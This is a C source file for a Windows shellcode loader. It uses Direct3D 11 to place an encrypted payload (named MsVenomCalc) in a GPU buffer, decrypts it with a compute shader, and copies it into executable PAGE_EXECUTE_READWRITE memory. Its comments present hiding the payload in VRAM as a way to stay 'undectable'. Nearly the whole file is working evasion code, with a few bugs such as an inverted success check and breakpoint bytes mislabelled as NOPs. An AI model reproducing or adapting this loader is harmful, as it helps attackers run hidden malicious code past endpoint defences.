#include "Shellcode.h"
#include "D3D11Functions.h"
#include "Utils.h"
#include <conio.h>


//Initializes the D3D11 Device, Device Context, CPU Buffer, and GPU Buffer
HRESULT InitD3D11(PD3D11_DATA data)
{

	/*
	Create D3D11 Device and Device Context,
	We are using D3D11_SDK_VERSION just to be safe,
	I need to do more research on swapchain possibilities, but for now we will just use the device and context
	*/
	HRESULT result = D3D11CreateDevice(NULL, D3D_DRIVER_TYPE_HARDWARE, NULL, 0, NULL, 0, D3D11_SDK_VERSION, &data->device, &data->featureLevel, &data->context);
	if (FAILED(result))
	{
		printf_s("[-]Failed to Create D3D11 Device and Device Context\n");
		return result;
	}

	
	
	//Check if device supports compute shaders
	if (data->device->lpVtbl->GetFeatureLevel(data->device) < D3D_FEATURE_LEVEL_11_0)
	{
		D3D11_FEATURE_DATA_D3D10_X_HARDWARE_OPTIONS hwOpts = { 0 };
		(void)data->device->lpVtbl->CheckFeatureSupport(data->device, D3D11_FEATURE_D3D10_X_HARDWARE_OPTIONS, &hwOpts, sizeof(hwOpts));
		if (!hwOpts.ComputeShaders_Plus_RawAndStructuredBuffers_Via_Shader_4_x)
		{
			//Release Context and Device
			data->context->lpVtbl->Release(data->context);
			data->device->lpVtbl->Release(data->device);

			printf_s("[-]Compute Shaders Not Supported\n");

			return E_FAIL;
		}
	}

	
	
	/*
	Create SubResource Data
	This is used to copy the shellcode to the GPU Buffer directly
	We dont need to fill out the pitch or slice pitch as we are not using a 3D texture buffer
	First zero out the structure
	*/
	memSet(&data->subResourceData, 0, sizeof(D3D11_SUBRESOURCE_DATA));
	data->subResourceData.pSysMem = MsVenomCalc;


	/*
	Create GPU Buffer
	Clarifying the buffer to be DEFAULT,
	which in terms of D3D11 means that the buffer is used for GPU read/write operations.
	You can also use D3D11_USAGE_IMMUTABLE if the data is not going to change,
	any other usage will most likely cause the buffer to use System Memory instead of VRAM
	We will be using UNORDERED_ACCESS and SHADER_RESOURCE as we will be using the buffer with a compute shader
	CPU will not access the buffer
	We will be using a raw buffer, which means the buffer will be used as a byte address buffer
	this buffer is completely inaccessable by the CPU, meaning anything is undectable
	First zero out the structure
	*/
	memSet(&data->gpuBufferDesc, 0, sizeof(D3D11_BUFFER_DESC));
	data->gpuBufferDesc.ByteWidth = SHELLCODE_SIZE;
	data->gpuBufferDesc.Usage = D3D11_USAGE_DEFAULT;
	data->gpuBufferDesc.BindFlags = D3D11_BIND_UNORDERED_ACCESS | D3D11_BIND_SHADER_RESOURCE;
	data->gpuBufferDesc.CPUAccessFlags = 0;
	data->gpuBufferDesc.MiscFlags = D3D11_RESOURCE_MISC_BUFFER_ALLOW_RAW_VIEWS;
	data->gpuBufferDesc.StructureByteStride = sizeof(UINT32);


	result = data->device->lpVtbl->CreateBuffer(data->device, &data->gpuBufferDesc, &data->subResourceData, &data->gpuBuffer);
	if (FAILED(result))
	{
		printf_s("[-]Failed to Create GPU Buffer\n");
		return result;
	}
	printf_s("[+]GPU Buffer Created\n");

	//Set sub resource to NULL
	//not nessesary, but just incase
	memSet(&data->subResourceData, 0, sizeof(D3D11_SUBRESOURCE_DATA));

	
	
	//Zero out buffer description, and recapture the buffer description
	//We do this to get the proper buffer description,
	//in case the buffer description was modified by the CreateBuffer function
	memSet(&data->gpuBufferDesc, 0, sizeof(D3D11_BUFFER_DESC));
	data->gpuBuffer->lpVtbl->GetDesc(data->gpuBuffer, &data->gpuBufferDesc);

	
	
	//Wow we will setup a shader resource view
	//First zero out the structure
	memSet(&data->rvDesc, 0, sizeof(D3D11_SHADER_RESOURCE_VIEW_DESC));
	data->rvDesc.Format = DXGI_FORMAT_R8_UINT;
	data->rvDesc.ViewDimension = D3D11_SRV_DIMENSION_BUFFER;
	data->rvDesc.Buffer.FirstElement = 0;
	data->rvDesc.Buffer.NumElements = SHELLCODE_SIZE;
	data->rvDesc.Buffer.ElementWidth = sizeof(UINT8);

	
	
	//Create the Shader Resource View
	result = data->device->lpVtbl->CreateShaderResourceView(data->device, data->gpuBuffer, &data->rvDesc, &data->computeShaderRV);
	if (FAILED(result))
	{
		printf_s("[-]Failed to Create Shader Resource View\n");
		data->gpuBuffer->lpVtbl->Release(data->gpuBuffer);
		return result;
	}
	printf_s("[+]Shader Resource View Created\n");

	
	
	//We will setup the ouput buffer(CPU Buffer) to store the decrypted shellcode
	//We will be using a raw buffer(refer to GPU buffer)
	//Again DEFAULT usage, as we will be using the buffer with a compute shader
	//CPU will access this buffer, but only when the buffer is mapped
	//We will be using UNORDERED_ACCESS and SHADER_RESOURCE as we will be using the buffer with a compute shader
	//First zero out the structure
	memSet(&data->cpuBufferDesc, 0, sizeof(D3D11_BUFFER_DESC));
	data->cpuBufferDesc.ByteWidth = SHELLCODE_SIZE;
	data->cpuBufferDesc.Usage = D3D11_USAGE_DEFAULT;
	data->cpuBufferDesc.BindFlags = D3D11_BIND_UNORDERED_ACCESS | D3D11_BIND_SHADER_RESOURCE;
	data->cpuBufferDesc.CPUAccessFlags = D3D11_CPU_ACCESS_READ | D3D11_CPU_ACCESS_WRITE;
	data->cpuBufferDesc.MiscFlags = D3D11_RESOURCE_MISC_BUFFER_ALLOW_RAW_VIEWS;
	data->cpuBufferDesc.StructureByteStride = sizeof(UINT8);

	result = data->device->lpVtbl->CreateBuffer(data->device, &data->cpuBufferDesc, NULL, &data->cpuBuffer);
	if (FAILED(result))
	{
		printf_s("[-]Failed to Create CPU Buffer\n");
		data->gpuBuffer->lpVtbl->Release(data->gpuBuffer);
		data->computeShaderRV->lpVtbl->Release(data->computeShaderRV);
		return result;
	}
	printf_s("[+]CPU Buffer Created\n");

	
	
	//Refer to GPU buffer for explanation
	memSet(&data->cpuBufferDesc, 0, sizeof(D3D11_BUFFER_DESC));
	data->cpuBuffer->lpVtbl->GetDesc(data->cpuBuffer, &data->cpuBufferDesc);

	
	
	//Now we will setup the Unordered Access View, for the Compute Shader
	//First zero out the structure
	memSet(&data->uavDesc, 0, sizeof(D3D11_UNORDERED_ACCESS_VIEW_DESC));
	data->uavDesc.Format = DXGI_FORMAT_R8_UINT;
	data->uavDesc.ViewDimension = D3D11_UAV_DIMENSION_BUFFER;
	data->uavDesc.Buffer.FirstElement = 0;
	data->uavDesc.Buffer.NumElements = SHELLCODE_SIZE;
	data->uavDesc.Buffer.Flags = 0;

	
	
	//Create the Unordered Access View
	result = data->device->lpVtbl->CreateUnorderedAccessView(data->device, data->cpuBuffer, &data->uavDesc, &data->computeShaderUAV);
	if (!FAILED(result))
	{
		printf_s("[-]Failed to Create Unordered Access View\n");
		D3D11Cleanup(data);
		return result;
	}
	printf_s("[+]Unordered Access View Created\n");

	return S_OK;
}


/*
Compiles the Compute Shader from a file and returns the shader blob
File must be in the same directory as the executable,
File must be a .hlsl file
*/
HRESULT CompileShaderFromFile(__inout PD3D11_DATA data, __in LPCWSTR filename, __in LPCSTR entrypoint, __out ID3DBlob** blob)
{
	
	//Set the flags for the shader
	UINT flags = D3DCOMPILE_ENABLE_STRICTNESS;

	//Get Cs Profile 
	LPCSTR profile = (data->device->lpVtbl->GetFeatureLevel(data->device) >= D3D_FEATURE_LEVEL_11_0) ? "cs_5_0" : "cs_4_0";

	//Create the error blob and shader blob
	ID3DBlob* errorBlob = NULL;
	ID3DBlob* shaderBlob = NULL;

	//Compile the shader
	HRESULT result = D3DCompileFromFile(filename, NULL, NULL, entrypoint, profile, flags, 0, &shaderBlob, &errorBlob);
	if (FAILED(result))
	{
		printf_s("[-]Failed to Compile Shader With Error : %s\n", (char*)errorBlob->lpVtbl->GetBufferPointer(errorBlob));
		errorBlob->lpVtbl->Release(errorBlob);
		return result;
	}	
	printf_s("[+]Shader Compiled\n");
	

	//Set the blob
	*blob = shaderBlob;

	return S_OK;
}





//Decrypts the Shellcode via the compute shader we created
HRESULT DecryptViaComputeShader(__inout PD3D11_DATA data)
{
	
	//Compile the Compute Shader
	HRESULT result = CompileShaderFromFile(data, L"DecryptShader.hlsl", "main", &data->computeShaderBlob);
	if (FAILED(result))
	{
		return result;
	}

	//Create the Compute Shader
	result = data->device->lpVtbl->CreateComputeShader(data->device, data->computeShaderBlob->lpVtbl->GetBufferPointer(data->computeShaderBlob), data->computeShaderBlob->lpVtbl->GetBufferSize(data->computeShaderBlob), NULL, &data->computeShader);
	if (FAILED(result))
	{
		printf_s("[-]Failed to Create Compute Shader\n");
		return result;
	}
	printf_s("[+]Compute Shader Created\n");
	

	//Set the Compute Shader
	data->context->lpVtbl->CSSetShader(data->context, data->computeShader, NULL, 0);

	//Set the Shader Resource View
	data->context->lpVtbl->CSSetShaderResources(data->context, 0, 1, &data->computeShaderRV);

	//Set the Unordered Access View
	data->context->lpVtbl->CSSetUnorderedAccessViews(data->context, 0, 1, &data->computeShaderUAV, NULL);

	
	/*
	Dispatch the Compute Shader
	We have 272 elements in the buffer, so we will dispatch 272 threads
	cs5.0 allows for 64 max Z threads, cs4.0 allows for 1
	we will use 34x8x1
	34 * 8 = 272
	this is for user friendliness, but most people should have cs5.0
	you just need the end value of x * y to be the number of elements in the buffer
	i dont think you want Z to be more than 1 as there is no depth
	*/
	printf_s("[+]Dispatching Compute Shader To Decrypt Shellcode\n");

	data->context->lpVtbl->Dispatch(data->context, 34, 8, 1);

	//set all the resources to NULL
	ID3D11UnorderedAccessView* nullUAV = NULL;
	ID3D11ShaderResourceView* nullSRV = NULL;
	data->context->lpVtbl->CSSetShader(data->context, NULL, NULL, 0);
	data->context->lpVtbl->CSSetUnorderedAccessViews(data->context, 0, 1, &nullUAV, NULL);
	data->context->lpVtbl->CSSetShaderResources(data->context, 0, 1, &nullSRV);


	return S_OK;
}



//Accesses the Data from the GPU Buffer
HRESULT AccessDataFromGpu(__inout PD3D11_DATA data, __out PVOID* allocatedMem)
{

	//Map the CPU Buffer
	//at this point this buffer will be visable in memory
	HRESULT result = data->context->lpVtbl->Map(data->context, data->cpuBuffer, 0, D3D11_MAP_READ_WRITE, 0, &data->mappedResource);
	if (FAILED(result))
	{
		printf_s("[-]Failed to Map Staging Buffer\n");
		return result;
	}

	

	//Allocate buffer with executable permissions
	PVOID execBuffer = VirtualAlloc(NULL, SHELLCODE_SIZE + 2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!execBuffer)
	{
		printf_s("[-]Failed to Allocate Memory\n");

		//Unmap the CPU Buffer
		data->context->lpVtbl->Unmap(data->context, data->cpuBuffer, 0);

		return E_FAIL;
	}

	//Copy the Shellcode to the Executable Buffer
	memCpy(execBuffer, data->mappedResource.pData, SHELLCODE_SIZE);
	//Add a double NOP, just in case(shouldnt be needed)
	memCpy(((UINT64)execBuffer + SHELLCODE_SIZE), "\xCC\xCC", 2, 2);

	printf_s("[+]Shellcode Located In Buffer Allocated At : 0x%I64X \n", execBuffer);

	
	//print the Shellcode
	printf_s("[+]Press >>SPACE<< to print Shellcode, Any Other Button To Skip\n");
	if (_getch() == VK_SPACE)
	{
		print(data->mappedResource.pData, SHELLCODE_SIZE);
	}


	//Unmap the GPU Buffer
	data->context->lpVtbl->Unmap(data->context, data->cpuBuffer, 0);

	//Set Resource to NULL
	memSet(&data->mappedResource, 0, sizeof(D3D11_MAPPED_SUBRESOURCE));

	//Set the allocated memory
	*allocatedMem = execBuffer;

	return S_OK;
}



//Checks if the CPU can access the GPU buffer
BOOLEAN CheckForCpuAccess(__inout PD3D11_DATA data)
{
	//Try to map the GPU Buffer
	HRESULT result = data->context->lpVtbl->Map(data->context, data->gpuBuffer, 0, D3D11_MAP_READ_WRITE, 0, &data->mappedResource);
	if (FAILED(result))
	{
		printf_s("[+]CPU Cannot Access the Buffer\n");
		return TRUE;
	}

	/*
	the only way this is possible,
	is if there wasnt enough VRAM to create the buffer.
	This is rare, or the buffer is too large for your GPU
	in this case it defaults to system memory
	*/

	printf_s("[-]CPU Can Access the Buffer\n");

	//Unmap the GPU Buffer
	data->context->lpVtbl->Unmap(data->context, data->cpuBuffer, 0);

	//Set Resource to NULL
	memSet(&data->mappedResource, 0, sizeof(D3D11_MAPPED_SUBRESOURCE));

	//Cleanup the D3D11 Data
	D3D11Cleanup(data);

	return FALSE;
}




//Cleans up the D3D11 Data
VOID D3D11Cleanup(__inout PD3D11_DATA data)
{
	//Release the Buffers
	if (data->gpuBuffer != NULL)
	data->gpuBuffer->lpVtbl->Release(data->gpuBuffer);

	if (data->cpuBuffer != NULL)
	data->cpuBuffer->lpVtbl->Release(data->cpuBuffer);

	//Release the Shader Resource View
	if (data->computeShaderRV != NULL)
	data->computeShaderRV->lpVtbl->Release(data->computeShaderRV);

	//Release the Unordered Access View
	if (data->computeShaderUAV != NULL)
	data->computeShaderUAV->lpVtbl->Release(data->computeShaderUAV);

	//Release the Compute Shader
	if (data->computeShader != NULL)
	data->computeShader->lpVtbl->Release(data->computeShader);

	//Release the Compute Shader Blob
	if (data->computeShaderBlob != NULL)
	data->computeShaderBlob->lpVtbl->Release(data->computeShaderBlob);

	//Release the Device Context
	if (data->context != NULL)
	data->context->lpVtbl->Release(data->context);

	//Release the Device
	if (data->device != NULL)
	data->device->lpVtbl->Release(data->device);
}
